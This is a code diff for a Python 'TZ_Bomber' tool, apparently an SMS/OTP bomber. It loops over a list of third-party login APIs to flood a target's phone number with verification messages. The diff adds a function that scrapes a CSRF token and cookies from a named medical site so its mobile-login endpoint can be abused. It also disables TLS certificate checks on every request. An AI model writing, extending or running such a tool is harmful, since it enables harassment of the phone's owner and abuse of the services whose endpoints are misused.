@@ -1,66 +1,99 @@
-from json import dumps, loads
+from json import dumps, loads, load
 from requests import get, post
 from random import choices
 from tldextract import extract
 from string import ascii_letters
 from threading import Thread
+from re import findall
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def send_dakterbhai(mobile):
+    resp=get('https://daktarbhai.com/')
+    cookies=''
+    headers={"Content-Type": "application/x-www-form-urlencoded"}
+    for key, value in resp.cookies.items():
+        cookies+=f'{key}={value}; '
+    csrf_token=findall('name="csrf-token" content="(.*?)"', resp.text)[0]
+    headers['X-CSRF-TOKEN'] = csrf_token
+    headers['Cookie'] = cookies
+    resp = post("https://daktarbhai.com/login/mobile", headers=headers, data="mobile=0"+str(mobile))
+    if resp.status_code==200 and resp.text=='': return True
+    else: return False
+
+def debug_write(domain, identifier, text, preback):
+	debug=open('debug.json', 'r')
+	data=load(debug)
+	debug.close()
+	debug=open('debug.json', 'w')
+	data.append({'domain':domain, 'identifier': identifier,'text': text,'preback': preback})
+	debug.write(dumps(data, indent=4))
+	debug.close()
 
 def get_random(length=10):
-    return "".join(choices(ascii_letters, k=length))
+	return "".join(choices(ascii_letters, k=length))
 
 def get_domain(url):
-    return ".".join(list(extract(url)))
+	return ".".join(list(extract(url)))
 
-def send_request(info:dict):
-    url=info["url"]
-    method=info["method"]
-    data=info["data"]
-    headers=info["headers"]
-    identifier=info["identifier"]
-    preback=info.get("preback")
-    if method.lower()=="get":
-        engine=get
-    elif method.lower()=="post":
-        engine=post
-    else:
-        print("Method Error:", get_domain(url))
-        engine=post
-    try:
-        resp=engine(url, data=data, headers=headers)
-    except KeyboardInterrupt:
-        exit()
-    except: return False
-    if identifier in resp.text:
-        return True
-    else:
-        if preback:
-            url=preback["url"]
-            method=preback["method"]
-            data=preback["data"]
-            headers=preback["headers"]
-            identifier=preback["identifier"]
-            if method.lower()=="get":
-                engine=get
-            elif method.lower()=="post":
-                engine=post
-            else:
-                print("Method Error:", get_domain(url))
-                engine=post
-            try:
-                resp=engine(url, data=data, headers=headers)
-            except KeyboardInterrupt:
-                exit()
-            except:return False
-            if identifier in resp.text:
-                return True
-            else:
-                #print(identifier)
-                #print(resp.text)
-                return False
-        else:
-            #print(identifier)
-            #print(resp.text)
-            return False
+def send_request(info:dict, mobile:int=None):
+	url=info["url"]
+	if 'daktarbhai' in url:
+		try:
+			return send_dakterbhai(mobile)
+		except:
+			return False
+	method=info["method"]
+	data=info["data"]
+	headers=info["headers"]
+	identifier=info["identifier"]
+	preback=info.get("preback")
+	if method.lower()=="get":
+		engine=get
+	elif method.lower()=="post":
+		engine=post
+	else:
+		print("Method Error:", get_domain(url))
+		engine=post
+	try:
+		resp=engine(url, data=data, headers=headers, verify=False)
+	except KeyboardInterrupt:
+		exit()
+	except:
+		# debug_write(get_domain(url), identifier, 'Try except', False)
+		return False
+	if identifier in resp.text:
+		return True
+	else:
+		if preback:
+			url=preback["url"]
+			method=preback["method"]
+			data=preback["data"]
+			headers=preback["headers"]
+			identifier=preback["identifier"]
+			if method.lower()=="get":
+				engine=get
+			elif method.lower()=="post":
+				engine=post
+			else:
+				print("Method Error:", get_domain(url))
+				engine=post
+			try:
+				resp=engine(url, data=data, headers=headers, verify=False)
+			except KeyboardInterrupt:
+				exit()
+			except:
+				# debug_write(get_domain(url), identifier, 'Try except', True)
+				return False
+			if identifier in resp.text:
+				return True
+			else:
+				# debug_write(get_domain(url), identifier, resp.text, True)
+				return False
+		else:
+			# debug_write(get_domain(url), identifier, resp.text, False)
+			return False
 
 def get_api(unlimited=False):
 	all_api=loads(open("all_api.json").read())
@@ -94,6 +127,7 @@ class TZ_Bomber:
 		self.run=False
 		self.completed=False
 		self.all_api=get_api(self.unlimited)
+		# print(len(self.all_api))
 
 	@property
 	def progress(self):
@@ -107,7 +141,7 @@ class TZ_Bomber:
 		while self.run:
 			api=self.all_api[self.i]
 			api=prepare_api(api, self.mobile)
-			request=send_request(api)
+			request=send_request(api, self.mobile)
 			self.attempt+=1
 			if request:
 				self.sent+=1
@@ -130,17 +164,4 @@ class TZ_Bomber:
 		
 	def stop(self):
 		self.run=False
-
-
-
-
-
-
-
-
-
-
-		
-
-
 
